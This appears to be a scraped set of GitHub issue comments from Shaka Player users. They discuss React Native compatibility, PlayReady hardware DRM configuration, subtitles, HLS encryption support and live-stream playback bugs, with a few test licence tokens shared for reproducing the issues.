overcome this hurdle. I'm not sure if / what other issues may come up, but hopefully this helps shed some light on the situation.. After further investigation today, we have tracked down the source of the issue, which confirms our initial suspicions that React Native is interfering with the functionality of `createObjectURL`, as used by Shaka. If we print out the function before injecting React Native, the following is printed to the console:\nfunction () { [native code] }\nAnd after React Native is injected, the function definition for `createObjectURL` is now:\nfunction createObjectURL(blob) {\n  if (BLOB_URL_PREFIX === null) {\n    throw new Error('Cannot create URL for blob!');\n  }\nreturn \"\" + BLOB_URL_PREFIX + blob.data.blobId + \"?offset=\" + blob.data.offset + \"&size=\" + blob.size;\n}\n``\nWhich originates from [this file](https://github.com/facebook/react-native/blob/e6057095adfdc77ccbbff1c97b1e86b06dae340b/Libraries/Blob/URL.js). The polyfill is then in turn executed [here](https://github.com/facebook/react-native/blob/0.55-stable/Libraries/Core/InitializeCore.js#L130). I suspect that storing a local reference to the original function at the time of including Shaka and executing that instead should help with React Native compatibility and overcome this hurdle. I'm not sure if / what other issues may come up, but hopefully this helps shed some light on the situation.. Hi @joeyparrish, thank you for the quick response! That is exactly what I was thinking. Right, good call regarding the unit tests. I am definitely interesting in helping contribute a pull request for this, and I've been experimenting with this already, but stuck with some linting errors that I am trying to work my way through. I will follow up once I have made some progress. Thanks again!. Hi @joeyparrish, thank you for the quick response! That is exactly what I was thinking. Right, good call regarding the unit tests. I am definitely interesting in helping contribute a pull request for this, and I've been experimenting with this already, but stuck with some linting errors that I am trying to work my way through. I will follow up once I have made some progress. Thanks again!. It looks like we have found a viable solution for solving this issue. I have internalized the originalcreateObjectURLfunction inside of the Media Source Engine and updated the unit tests accordingly and we have managed to get playback working on React Native! We will do some more internal testing and then open a pull request soon.. It looks like we have found a viable solution for solving this issue. I have internalized the originalcreateObjectURL` function inside of the Media Source Engine and updated the unit tests accordingly and we have managed to get playback working on React Native! We will do some more internal testing and then open a pull request soon.. I opened a PR from my personal account. Please let me know if any changes are needed! Thanks.. No problem! Sure thing, sorry about that.. I can confirm that I am also seeing this on Tizen as well, possibly after creating additional player instances.. I can confirm that I am also seeing this on Tizen as well, possibly after creating additional player instances.. ",
    "shabab11": "we are using Opentext for DAM, can shaka player be used to retrieve or play files (video or audio) from opentext.. @joeyparrish yes i mean to say \"subtitles\".....Thanks. @joeyparrish subtitle issue has been resolved........I am able to play video with subtitle without any error \ud83e\udd47  .............can u confirm that shaka only allow .vtt format subtitle because .txt and .srt was not playing in my case. Also I need a download option for the video am playing, so that user can download the video as well........ can u give some insight on download feature by shaka please??. @joeyparrish thank you so much for your help and i am sorry for not creating a new issue..... I will create a new issue for rest of my queries.... Thank you once again. We can close this issue now :). Hi with the help of above mentioned tutorial I am able to add download feature to my player. But\n I am getting download button outside of the player I want the option on player screen like we have picture and caption option on video screen inside ...  is it possible to get it done?. No they are not.\nI want to put checkpoints on stream/buffer line and I want to create links to those checkpoints so that when user click that link he can start watching the video from that particular checkpoint on the streaming line.. Thanks @TheModMaker  hope this will work.......will get back to you for further info if needed.. @TheModMaker ..........Thank you........ I am able to add and play chapters/checkpoint. we can close this issue now.. @joeyparrish thanks let me work through again with my code and I will ;provide you the snippets if am unable to make it work. Can I borrow some time for the issue to be open lil longer if possible? . Sounds good...........thank you :). ",
    "dmunozpolo": "Hi,\nLooking into #1570 it seems that you has been put that one into the backlog. Does it mean that you are now working in this ticket, #816?\nThanks.\n. Thanks. Do you have some tentative ETA to have #816 solved?. Hi,\nWe are interested in having the issue of Shakaplayer being able to play FairPlay encrypted streams in Safari.\nCould we have an estiamtion if this could be included in v2.5? It would be very helpful for us.\nThanks.. Hi,\nMy main concern is knowing when the issue for Shakaplayer being able to play FairPlay encrypted streams in Safari will be available.\nI guess the issue is this one:  \"Safari Fairplay MediaKeys Polyfill #382\", am I right?\nCould you help me with this?\nThanks.. Thanks for the update.\nAny new update on when #382 will be ready?. Hello all,\nSorry to ask again but do we have updated information on when #382 will be completed?\nI know you were working on #816 but it is important for us to get #382 ready.\nThanks for your help!. I see that #382 is planned for V2.5, unless I am wrong.\nIs there a planned date for releasing v2.5?\nThanks.. ",
    "vladimir-kazakov": "I would like to request this feature as well, because the usage of PlayReady Hardware DRM is required for higher value content. It seems to me that there's no work happening on this feature, because there's no clear understanding how it must work. I'll try to clarify it.\nPlayReady Hardware DRM is another key system that Shaka Player must support, which is com.microsoft.playready.hardware. It must be possible to specify this key system in the DRM configuration. For example:\nplayer.configure({\n  drm: {\n    servers: {\n      'com.microsoft.playready.hardware': 'https://drm-playready-licensing.axtest.net/AcquireLicense'\n    }\n  }\n});\nCurrently, it doesn't work. I get the following error in the console:\n```\nload() failed: shaka.util.Error { \"severity\": 2, \"category\": 6, \"code\": 6012, \"data\": [], \"handled\": false, \"message\": \"Shaka Error DRM.NO_LICENSE_SERVER_GIVEN ()\", \"stack\": \"Error: Shaka Error DRM.NO_LICENSE_SERVER_GIVEN ()\\n at shaka.util.Error (https://example/shaka/2.3.3/js/shaka-player.compiled.debug.js:43:480)\\n at Anonymous function (https://example/shaka/2.3.3/js/shaka-player.compiled.debug.js:119:320)\" } Shaka Error DRM.NO_LICENSE_SERVER_GIVEN () Error: Shaka Error DRM.NO_LICENSE_SERVER_GIVEN () at shaka.util.Error (https://example/shaka/2.3.3/js/shaka-player.compiled.debug.js:43:480) at Anonymous function (https://example/shaka/2.3.3/js/shaka-player.compiled.debug.js:119:320)\nError code 6012 object shaka.util.Error { \"severity\": 2, \"category\": 6, \"code\": 6012, \"data\": [], \"handled\": false, \"message\": \"Shaka Error DRM.NO_LICENSE_SERVER_GIVEN ()\", \"stack\": \"Error: Shaka Error DRM.NO_LICENSE_SERVER_GIVEN ()\\n at shaka.util.Error (https://example/shaka/2.3.3/js/shaka-player.compiled.debug.js:43:480)\\n at Anonymous function (https://example/shaka/2.3.3/js/shaka-player.compiled.debug.js:119:320)\" }\n```\nI guess it happens because Shaka Player doesn't know anything about the com.microsoft.playready.hardware key system.\nRobustness values in the advanced DRM configuration is not an option, because PlayReady doesn't use such concept. PlayReady clients have a security level property. Currently, there are 3 security levels defined: 150 (test clients), 2000 (clients that use software-based security; Software DRM) and 3000 (clients that use hardware-based security; Hardware DRM). It's possible to use security levels 150 and 2000 with the com.microsoft.playready key system, but 3000 is only available when using the com.microsoft.playready.hardware key system. The security level is a property of a PlayReady client, which depends on a key system that is being used. It's not possible to change the security level manually.\nIn order to be able to use PlayReady Hardware DRM (the com.microsoft.playready.hardware key system), you have to use the latest Windows 10 and your hardware must have a Trusted Platform Module (TPM) 2.0. Both Edge and Internet Explorer support this key system. You can use the Hardware DRM test page in order to check whether your system supports Hardware DRM. It's also important to mention that Hardware DRM doesn't work in virtual machines or when a remote desktop session is active.\nIn order to acquire a license, the client sends a license request to a license server. The client mentions its security level in the license request, so the security level is available to the license server. The license server uses this info to generate a license. The license has a \"minimum security level\" policy, which means that the client may use a license only if its security level is equal or higher than the minimum security level specified in the license. For example, if the license says that only clients with security level 2000 are allowed to use the license, then clients with security level 150 won't be able to use the license. In fact, the license server will even refuse to give such license to the client, because the client's security level is lower than what's required.\nThis all means that since Shaka Player doesn't support the com.microsoft.playready.hardware key system, it's impossible to acquire a license with a minimum security level 3000, which is a license that can only be used by highly-secure clients that use hardware-based security. Axinom's PlayReady license server allows requesting the minimum security level through the DRM message. You may try it by using the following info:\n\nMedia: https://media.axprod.net/TestVectors/v7-MultiDRM-SingleKey/Manifest_1080p.mpd\nLicense server: https://drm-playready-licensing.axtest.net/AcquireLicense\nDRM message, specified in the X-AxDRM-Message HTTP header, that requests a license with a minimum security level 3000: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ2ZXJzaW9uIjoxLCJjb21fa2V5X2lkIjoiYjMzNjRlYjUtNTFmNi00YWUzLThjOTgtMzNjZWQ1ZTMxYzc4IiwibWVzc2FnZSI6eyJ0eXBlIjoiZW50aXRsZW1lbnRfbWVzc2FnZSIsImtleXMiOlt7ImlkIjoiOWViNDA1MGQtZTQ0Yi00ODAyLTkzMmUtMjdkNzUwODNlMjY2IiwiZW5jcnlwdGVkX2tleSI6ImxLM09qSExZVzI0Y3Iya3RSNzRmbnc9PSJ9XSwicGxheXJlYWR5Ijp7Im1pbl9hcHBfc2VjdXJpdHlfbGV2ZWwiOjMwMDB9fX0.KmKYAEpixHf6J_On65Q5w-Lkn6HkfwVFE-z5oJygssY\n\nSending a license request from a PlayReady client that has security level 2000 will result in the following error:\nStatus code: HTTP 500\nResponse body: License denied. Your DRM client's security level is 2000, but the entitlement message requires 3000 or higher.\nSending a license request from a client that has security level 3000 should result in a license response.\nThat's a lot of reading, but hopefully it clarifies how things are expected to work. I guess, for Shaka Player all these details are not very important, and it all boils down to simply adding support for another key system, which is com.microsoft.playready.hardware.\nMore info about PlayReady and EME can be found here.\nIt's also worth mentioning that supporting PlayReady Hardware DRM is important not only because of movie studio requirements, but also because Hardware DRM is required in order to use licenses with AES CBC keys. Microsoft is going to add support for cbc1 and cbcs protection schemes, defined in the CENC standard, to their PlayReady clients, and licenses with CBC keys can only be requested by clients that use Hardware DRM (their security level is 3000).. ",
    "swenkeratmicrosoft": "FYI: When using the com.microsoft.playready.recommendation key system string, you can explicitly request hardware DRM by setting the MediaKeySystemMediaCapability's \"robustness\" string to \"3000\" for the corresponding contentType.  Of note, only certain contentType values support Hardware DRM - e.g. hardware DRM is never supported for any audio content; hardware DRM is only supported for HEVC content when the corresponding hardware, codec, and drivers are available; etc.  When \"3000\" is specified for the \"robustness\" string and Hardware DRM is not supported for the given contentType, requestMediaKeySystemAccess will behave as defined by the W3C Recommendation 18 September 2017 specification as linked here:\nhttp://www.w3.org/TR/2017/REC-encrypted-media-20170918/#navigator-extension:-requestmediakeysystemaccess()\nHere is an example javascript code snippit that explicitly requests Hardware DRM for AVC1 video content.  Only Software DRM is supported for audio streams, so the \"robustness\" string is not specified for the audio codec.  (Obviously, because this code snippit only specifies a single MediaKeySystemConfiguration, the promise will be rejected if Hardware DRM is unavailable as per the EME specification.)\n    navigator.requestMediaKeySystemAccess(\"com.microsoft.playready.recommendation\", [\n        {\n            initDataTypes: [\"cenc\"],\n            audioCapabilities: [\n                {\n                    contentType: \"audio/mp4; codecs='mp4a'\"\n                }\n            ],\n            videoCapabilities: [\n                {\n                    contentType: \"video/mp4; codecs='avc1'\", robustness: \"3000\"\n                }\n            ],\n            distinctiveIdentifier: \"required\",\n            persistentState: \"required\"\n        }\n    ]).then( ...\n\nI hope this helps,\n-Sam Wenker with the Microsoft PlayReady team. Note that the com.microsoft.playready.recommendation key system string is only supported as of the Windows 10 April 2018 update.\n-Sam Wenker with the Microsoft PlayReady team. I am investigating the status of documentation as mentioned in the following comment and will reply to that thread when I have more information.\nhttps://github.com/Dash-Industry-Forum/dash.js/issues/2658#issuecomment-405690840\nThanks,\n-Sam Wenker with the Microsoft PlayReady team. ",
    "skstronghold": "Setting proper aspect ratio fixed the issue.. ",
    "yuenghole": "Hi, Joey.\nThis ticket can be closed due to there was a coding typo on my application.\nThanks alot.. I hereby close this issue.. Thanks a lot, Joey. \nYour Shaka Player is fantastic!!!\nBesides, may I know when this enhancement will be released?\nThank you very much.. ",
    "russitto": "Hi, getTracks/getVariantTracks uses variant id.getStats() uses track id.\nTrack objects are not public via api.\nPlease show me how to get track objects or include Track object in getStats().\nThanks! :). It's fine with switchHistory matching Track IDs.\nThx. Sorry, im forget to rebase. Forget/cancel this PR and ill do it another.. ",
    "aaani": "My apologies. Issue was in my playlist - the default_KID was hardcoded to be the keyID of the specific pair that worked for me.. Thanks. I'll close this issue.. Awesome, that answers the second half of my question, so I can have a custom attribute and parse it in the configuration.\nIs there any standard attribute/syntax for widevine that I can set in the manifest and shaka player would automatically default the license url to it? In #484 I do see there is some interest for ms:laurl, does widevine has a counterpart to it?. Thanks! . Makes sense. Thanks for the clarification @TheModMaker.. ",
    "bhh1988": "Is it not a violation of abstraction for StreamingEngine to know whether the manifest is live or VOD?\nFor this live content lag scenario you mention, is there a reason why we can't expect the user to feed in appropriate retry parameters to guard against that? Perhaps the fear is that there are too many people expecting the default retry parameters to just work? In that case, how about if the retry-parameters ARE supplied, we can honor only those and not call handleNetworkError_()?. I created a pull-request for this. For the conf value, I chose the name \"infiniteRetriesForLiveStreams\". Not sure if you guys agree with the name, but the suggested \"retryForLiveStreams\" seemed misleading to me because even with it false, there will still be retries for live streams according to the passed in RetryParameters. I'm open to suggestions for alternatives.. Thanks for answering. Should shaka-player then be adapting within the same id instead then? That seems to be what the dash spec would require (adapting within the same representation ID).\nGiven our constraints, do you recommend I just proceed with my current strategy of putting unique values for the role of each track, even though they are non-standard values? I feel a little uncomfortable relying on the fact that Shaka currently accepts non-standard role values. Thanks @joeyparrish . Yea I mean adapting within the same adaptation set, not adapting within the same representation ID.\nOk I understand what you mean, and I feel more comfortable about the stability of shaka-player's current behavior for non-standard role values, but one thing to be clear is that it's hard in my use-case to find an appropriate \"semantic meaning\" for each audio track, because the video files we receive are arbitrary and essentially like a black box - we have no idea what the purpose of each audio track is for. Essentially the only semantic meaning we can derive is their order, so basically name the roles as \"1\", \"2\", \"3\", etc.\nThe fact that we have to resort to naming our roles \"1\", \"2\", \"3\" feels artificial, and essentially an artifact of the way shaka-player does things. Since shaka-player requires you to uniquely define audio tracks by (language, role) tuples, this forces us to make those tuples unique for every audio track. This is why I posed the question in #947 about exposing the adaptation-set IDs in the variants. I don't have enough context to know if abstracting those IDs away in the variants was a conscious decision though.... Yes, we can work with the numbered roles for now.\nI can explain in a little more detail about our situation. We store arbitrary files uploaded from customers and if we detect the file is a video file, we transcode it into a format that can be viewed on the browser (with shaka-player), so that when users try to \"view\" the file in the browser, they can watch the contents of the video. On our end, we have no idea what the purpose of the file is and have no semantic information on the individual tracks of the file. If the file happens to have multiple audio tracks, we cannot know which audio tracks are commentary or secondary or main. So using the \"role\" DASH parameter is inappropriate to us, because we don't know what the roles of each track are. Ideally, our manifest would look something like:\n```\n\n\n\n\n\n\n\n\n\n\n\n\n```\nAnd there would still be a way of selecting between the audio-tracks/adaptation-sets, presumably by an id (hence the original question in this thread). But right now, shaka will surface each of these tracks as language=\"und\" and roles=[], and then there would be no well-defined way to switch between them because they all have the same language/role.\nLet me know if there's still anything unclear or that you want me to elaborate on.. Yes this seems to be fixed now. Thanks!. I realize this issue still exists in 2.1.6. Makes sense because https://github.com/google/shaka-player/commit/7e0f46931e122859d57ef0507143f3ebd4d604d5 isn't on that branch yet. Is there a plan to backport the fix? What's the policy for closing issues under these kinds of circumstances?. Ok I rebased and forced update on my branch. Do I have to create a new pull-request?. Looks good. Can someone merge this? Then please look at https://github.com/google/shaka-player/pull/950. Thanks for taking a look @vaage \nI've pushed a new update, addressing your concerns. I wasn't aware of #918 at the time, thanks for pointing that out - I have fixed that issue as well since it was somewhat similar. I recognize that the filterTextStreams and filterVariants code look nearly identical and was hoping to merge them to address #858 as well,  but unfortunately the current logic is different enough (due to there being 2 streams, audio/video, for variants, versus 1 stream for text) that I decided to leave that much alone.\nAs far as testing goes, I added more unit tests that cover pretty much all the combinations of language, role, primary-state. These tests would've failed without my changes, and therefore should catch any regressions. However I did not write tests that explicitly test ABR, because my changes are technically isolated to the filter functions, which fix the ABR issue only incidentally. Testing for the ABR issue would be an integration test instead of a unit test, and I'm not familiar enough yet with the code-base to add such a thing soon. If you still feel like an integration test should be added, perhaps another issue can be filed?\nAlso, can someone answer my question in #947 ? I'm questioning whether it was intended to hide adaptation-set IDs from the variants?. Actually this depends on the array-utils function I added in https://github.com/google/shaka-player/pull/949, but I think the latter will be merged soon.. ",
    "DanielLindstrm": "Yes, it would help.\nThanks.\n. ",
    "adgllorente": "Hi,\nI've seen the milestone has been changed several times, @joeyparrish is the support to smpte-tt planned to be included in the 2.5 release or it will be moved to another release?\nI'm asking because we are so interested in having the support for smpte-tt and it would be great to know when is expected.\nThanks!. Thanks for the information @vaage, I've seen the bug related has been fixed in Chrome 62. I've tried with a Chrome Canary (v63) and I have reproduced it but just sometimes and when the headset is plugged, anyway I will report this to the Chrome team since this is on their side.. Thank you so much for the information, I guess we will have to wait for a more consistent way to handle this situation.\nI'm closing the issue since question has been properly answered.. I've been able to reproduce what you say but it hasn't happened 100% of the times. It sometimes  works different. For example, it happened to me once, with \"jump large gaps\" enabled, playback hasn't started automatically even when play button has been clicked.\nAs you say, it may be a problem with autoplay and \"jump large gaps\", both together.. It's a weird situation because it doesn't happen always. I've run several tests with the new code from \"master\" branch and I've found it happens to me every time I open a new \"InPrivate tab\". These are all the tests I've run and the result obtained.\n--- Open browser\n1. NOK (Play button shown, nothing happened when clicked.)\n--- UNLOAD & LOAD\n2. OK\n--- UNLOAD & LOAD\n3. OK\n--- UNLOAD & LOAD\n4. OK\n--- REFRESH\n5. OK (8seg waiting)\n--- UNLOAD & LOAD\n6. OK\n--- UNLOAD & LOAD\n7. OK\n--- New InPrivate tab\n8. NOK (Play button shown, nothing happened when clicked.)\n--- UNLOAD & LOAD\n9. NOK (Play button shown, nothing happened when clicked.)\n--- UNLOAD & LOAD\n10. OK\n--- UNLOAD & LOAD\n11. OK (Time to play: 6s.)\n--- New InPrivate tab\n12. NOK (Play button shown, nothing happened when clicked. I've clicked Pause/Play several times and nothing happened)\n--- UNLOAD & LOAD\n13. NOK (Play button shown, nothing happened when clicked.)\n--- UNLOAD & LOAD\n14. OK\n--- UNLOAD & LOAD\n15. OK\n--- UNLOAD & LOAD\n16. OK\n--- New InPrivate tab\n17. NOK\n--- UNLOAD & LOAD\n18. NOK\n--- UNLOAD & LOAD\n19. NOK\n--- REFRESH \n20. OK\n--- REFRESH\n21. OK\n--- REFRESH\n22. OK\nI've also prepared a video with the bug happening because maybe it gives you more information.\n. My fault, the token has expired, here you have a new one\nAU_ZGAE6U_leWdjkARXhUbcTAp4HpEpiW6hEFKSE_nPBFMHeQ9-PQwKe8CGldjHbCKQ_4n2HKS5Vdl2z1P2ZYtEOQH_jejpMPsXC6M2edUaz_QJR0-IqnevrjrxImRVsETeqo1Uq-FpwlUeaf87yagX4mmhfuorDvU2iVBuHDWX4onz7Lx3PXfbrh1_f_VaV1kynFwRXWgK8xrvo30jJQq9w3gtoRax75fdLxk_sTwgj8nwVLHz6k\nI'm sure you already know but you should use it like this:\njs\n  player.getNetworkingEngine().registerRequestFilter((type, request) => {\n    if (type == shaka.net.NetworkingEngine.RequestType.LICENSE) {\n      request.headers = {\n        'content-type': 'text/xml',\n        'x-authentication': 'AU_ZGAE6U_leWdjkARXhUbcTAp4HpEpiW6hEFKSE_nPBFMHeQ9-PQwKe8CGldjHbCKQ_4n2HKS5Vdl2z1P2ZYtEOQH_jejpMPsXC6M2edUaz_QJR0-IqnevrjrxImRVsETeqo1Uq-FpwlUeaf87yagX4mmhfuorDvU2iVBuHDWX4onz7Lx3PXfbrh1_f_VaV1kynFwRXWgK8xrvo30jJQq9w3gtoRax75fdLxk_sTwgj8nwVLHz6k',  // eslint-disable-line max-len\n      };\n    }\n  });\nLet me know if you're able to start the playback.. I've created a new one with an expiration of a month (Until 03/01/2019)\nAU_ZGAE6U_DsdIZJkbeFkPHLrlC8nrmCKJhuPwy5OP4wQkxMVGJgy6fgnsD_GNWrlFkgnEfJdz7gET2XXzdDZiJegvFuMSLkTTUsisGRqkdTBLotG8OfpAwgXdEIq7lFvbUyh2J8J6bLmaMaja8DDjbnM_FEmaZRkRggzb1-fY_DoPs0dgnUFSTxzXlKq5iYvXVAjoYPNGe_TocPuawPcRuajd0xp6ycRbxMOlsV3YiaEgIxyslIM. Have you tried with other kind of streams? Just to confirm it is something related with the browser and not with the stream.. Here you have another one for a month, let me know if it doesn't work\nAU_ZGAE6U_ZdrfcZYdZLb8IYcWvWOqDdxIECT7Ksn0oc5v2MDwkx5BuYlo6t0kIsqskYerpc97IuWwVebkSCo1lc_Y4Gq4mmVrLdJ4eIvd4EdNG5-0GOnuAJf1zub6z7f7p3A2ZMh57Ib9SH6JRHL-I6C9DLD3aXfjrlura4eOUWDtWhvbkqRyV50vsanxcvgrBiKhpqwgg1w0Wpec_JWYFKyTBgxPzeV0aCDjIE0clSjGda27MnXldpwC_jx4RzrU2toFEsQR. Yep, our QA team was able to reproduce it in a physical Windows machine. I've checked with all teams working in the testing environment and they have confirmed me they've been enabling/disabling the DRM issuer these days. I guess that's why you were able to play the stream without a proper license.\nI'm currently at GMT+1 but I've been a little occupied these days. Anyway I'm going to give this issue a higher priority in order to give you feedback ASAP.. I've checked right now and environment is working with DRM and token is still valid, so you should be able to play again.. I've tried our stream with new shaka-player version from master, Edge 18 and Insider Preview and I'm able to reproduce it.\nI've also tried with your live stream named Big Buck Bunny (DASH-IF and Wowza) and they work fine, they don't get frozen during startup.\nMay it be related with DRM? Do you have another kind of live streams with DRM to test?. Good to know! Thank you so much for the information \ud83d\udc4d. Good to know! Thank you so much for the information \ud83d\udc4d. Hi @vaage, we've been reviewing the MPD with our Video Core Team and we have found that the MPD has a clock sync issue on the availabilityStartTime property.\nWe've seen in the issue attached (#1727) that new shaka release does not depend on the availabilityStartTime and uses the internal time from the fragments instead.\nSo that, we have removed the clock sync issue from the stream and playback is working fine in both 2.4 and 2.5 releases of the shaka-player.\nI'm closing the issue because no more support is needed from you, thank you so much for your time.. Hi @vaage, we've been reviewing the MPD with our Video Core Team and we have found that the MPD has a clock sync issue on the availabilityStartTime property.\nWe've seen in the issue attached (#1727) that new shaka release does not depend on the availabilityStartTime and uses the internal time from the fragments instead.\nSo that, we have removed the clock sync issue from the stream and playback is working fine in both 2.4 and 2.5 releases of the shaka-player.\nI'm closing the issue because no more support is needed from you, thank you so much for your time.. ",
    "jimmywarting": "hmm, okey.\nWould still want this to work with Shaka player, it has other advantage like ChromeCast, offline/download support.\nI got a question. if i want to cast a flv don't I need a custom receiver app then?. I won't do it. and i don't need it anymore. Chrome and Chromecast supports it.\nSeeing this as it's more like a standard more browser will eventually support it.\nI know YouTube use the presentation API and it could cast to my smart Samsung TV that didn't had a Chromecast. Probably cuz it use DIAL protocol but not 100 sure. ",
    "kjnsn": "So the browser is actually doing what the spec says: https://w3c.github.io/webvtt/#webvtt-cue-line-automatic\nIf all lines are \"auto\", the first cue will be given the line -1, the second -2, and so on. This leads to the captions appearing reversed.  I've checked dash.js and it has the same issue.. ",
    "DiegoZurita": "Is there any workaround to use AES-128 HLS encrypted?. ",
    "elv-peter": "I ran into this problem as well. You can easily generate a test with Bento4:\nmp4hls --encryption-key 37d7ad30b2a8e801864b023e330c4b02 -o test --output-encryption-key --exec-dir=/usr/local/Cellar/bento4/1.5.1-628/bin trailer_1080p.mov\nSafari, VLC, and videojs are all able to play it. Shaka gives me HLS_COULD_NOT_PARSE_SEGMENT_START_TIME (code 4030). If you decide not to add this feature, perhaps at least check for EXT-X-KEY in the manifest and output a more informative error message like \"AES not supported\"?. ",
    "sirpy": "how would do i enable TS support? i just tried it via the demo link to shaka,\ncan you paste the code or a link for a demo that plays it?. i want to use shaka on my app to play both hls and mpd files, so i guess\nit's not completely supported yet.\nOn Fri, Jun 9, 2017 at 7:54 PM, ismena notifications@github.com wrote:\n\n@sirpy https://github.com/sirpy\nAh, sorry my previous comment was confusing. I have a custom Chrome build\nwith enabled TS, that's not applicable to a wider audience.\nYou can try our normal demo page with your asset in Microsoft Edge or cast\nit to Chromecast via Chrome if you have one handy.\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub\nhttps://github.com/google/shaka-player/issues/851#issuecomment-307442474,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/AAo9dzG6JDvhOocrGStzHXBaOa5EKlwBks5sCXjbgaJpZM4NxGLa\n.\n. the hls.js by dailymotion is able to play this file, so it's not a browser\nlimitation\n\nOn Tue, Jun 13, 2017 at 12:23 AM, ismena notifications@github.com wrote:\n\nWe are bound by what browsers can support, so there's not much we can do\nabout this on shaka side. As(if) more browsers add support for TS segments\nyou will be able to use shaka player for it.\nIf you have mp4 content (.mp4 media files rather then .ts) described by\nhls manifest, it will work with most major browsers today.\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub\nhttps://github.com/google/shaka-player/issues/851#issuecomment-307933320,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/AAo9d7RtI2Khe5cAe-rd5jC6w7d8ktlOks5sDaxEgaJpZM4NxGLa\n.\n. \n",
    "ddennedy": "Well, I just clicked shift-reload and the problem is gone. I am fairly sure I had already tried that. :) Oh well; case closed.. ",
    "theifish": "Yes, I want to know which segment are now actually playing in video stream (depends on its timing, bitrate and other params).. We use P2P for chunks (lib replaces global XHR object), and we need to know if current playing chunk loaded over P2P or from CDN to gather statistics.. Of course it's a good idea to use HTTP plugin replacement instead of global XHR replacing, however we use third-party company solution and it takes a time to develop this replacement for them.\nAnyway, it doesn't resolve our needs, the statistic based on current playing chunk state (not loading).. Hi @maxbaluev.\nDid you publish new plug-in? More than one week passed yet :). Here is MPD example:\n<MPD xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns=\"urn:mpeg:dash:schema:mpd:2011\" xmlns:cenc=\"urn:mpeg:cenc:2013\" xsi:schemaLocation=\"urn:mpeg:dash:schema:mpd:2011 http://standards.iso.org/ittf/PubliclyAvailableStandards/MPEG-DASH_schema_files/DASH-MPD.xsd\" type=\"dynamic\" publishTime=\"2017-06-13T09:46:39\" minimumUpdatePeriod=\"PT10S\" availabilityStartTime=\"2017-06-09T13:50:08Z\" minBufferTime=\"PT30S\" suggestedPresentationDelay=\"PT30S\" timeShiftBufferDepth=\"PT2H0M0S\" profiles=\"urn:mpeg:dash:profile:isoff-live:2011\">\n<Period start=\"PT0S\" id=\"1\">\n<AdaptationSet mimeType=\"video/mp4\" frameRate=\"25/1\" segmentAlignment=\"true\" subsegmentAlignment=\"true\" startWithSAP=\"1\" subsegmentStartsWithSAP=\"1\" bitstreamSwitching=\"false\">\n<SegmentTemplate timescale=\"90000\" duration=\"900000\" startNumber=\"1\"/>\n<Representation id=\"1\" width=\"1280\" height=\"720\" bandwidth=\"2400000\" codecs=\"avc1.64001f\">\n<SegmentTemplate duration=\"900000\" startNumber=\"1\" media=\"/streams/tv/tvdash1-Frag-hd-5-20170609T134945_$Number%09d$.mp4\" initialization=\"tvdash1-Frag-hd-5-20170609T134945init.mp4\"/>\n</Representation>\n<Representation id=\"2\" width=\"1280\" height=\"720\" bandwidth=\"1250000\" codecs=\"avc1.64001f\">\n<SegmentTemplate duration=\"900000\" startNumber=\"1\" media=\"/streams/tv/tvdash1-Frag-hd-4-20170609T134945_$Number%09d$.mp4\" initialization=\"tvdash1-Frag-hd-4-20170609T134945init.mp4\"/>\n</Representation>\n<Representation id=\"3\" width=\"640\" height=\"360\" bandwidth=\"950000\" codecs=\"avc1.4d401e\">\n<SegmentTemplate duration=\"900000\" startNumber=\"1\" media=\"/streams/tv/tvdash1-Frag-hd-3-20170609T134945_$Number%09d$.mp4\" initialization=\"tvdash1-Frag-hd-3-20170609T134945init.mp4\"/>\n</Representation>\n<Representation id=\"4\" width=\"640\" height=\"360\" bandwidth=\"650000\" codecs=\"avc1.4d401e\">\n<SegmentTemplate duration=\"900000\" startNumber=\"1\" media=\"/streams/tv/tvdash1-Frag-hd-2-20170609T134945_$Number%09d$.mp4\" initialization=\"tvdash1-Frag-hd-2-20170609T134945init.mp4\"/>\n</Representation>\n<Representation id=\"5\" width=\"640\" height=\"360\" bandwidth=\"350000\" codecs=\"avc1.4d401e\">\n<SegmentTemplate duration=\"900000\" startNumber=\"1\" media=\"/streams/tv/tvdash1-Frag-hd-1-20170609T134945_$Number%09d$.mp4\" initialization=\"tvdash1-Frag-hd-1-20170609T134945init.mp4\"/>\n</Representation>\n</AdaptationSet>\n<AdaptationSet mimeType=\"audio/mp4\" lang=\"rus\" segmentAlignment=\"0\">\n<SegmentTemplate timescale=\"48000\" media=\"/streams/tv/tvdash1-Frag-hd-audio-20170609T134945_$Number%09d$.mp4\" initialization=\"tvdash1-Frag-hd-audio-20170609T134945init.mp4\" duration=\"480000\" startNumber=\"1\"/>\n<Representation id=\"6\" bandwidth=\"96000\" audioSamplingRate=\"48000\" codecs=\"mp4a.40.2\"/>\n</AdaptationSet>\n<AdaptationSet mimeType=\"application/mp4\" lang=\"rus\">\n<Role schemeIdUri=\"urn:mpeg:dash:role\" value=\"subtitle\"/>\n<SegmentTemplate timescale=\"90000\" media=\"/streams/tv/tvdash1-Frag-hd-caption-20170609T134945_$Number%09d$.mp4\" initialization=\"tvdash1-Frag-hd-caption-20170609T134945init.mp4\" duration=\"900000\" startNumber=\"1\"/>\n<Representation id=\"7\" bandwidth=\"256\" codecs=\"stpp\"/>\n</AdaptationSet>\n</Period>\n</MPD>. @joeyparrish sorry, actual version is 2.1.3\nWe use Elemental Live.. @joeyparrish, I'm trying to build v2.1.6 within ./build/all.py and see the following error:\n[ERROR] *** A required dependency is missing: java\nHave no idea why it need java.\n. I managed it, just start using jre64 from my Webstorm location. (I wish one day you'll change packager to any ordinary :) ).\nAnyway, in 2.1.6 subtitles work, so the issue is resolved.. Confirm the bug.\nWhen currentTime reaches lowest available time (video.currentTime < shakaPlayer.seekRange().start), shaka starts to load chunks forward and automatically seeks to last available lowest time untimelly.\nIt's very annoying behaviour for a user.\nI think the proper way is to update mpd file periodically and not to load video/audio chunks, and when user press play, just seeks to last available time (if out of range).. ",
    "maxbaluev": "@theifish Do not worry about it. We will provide the ready plug-in next week.. ",
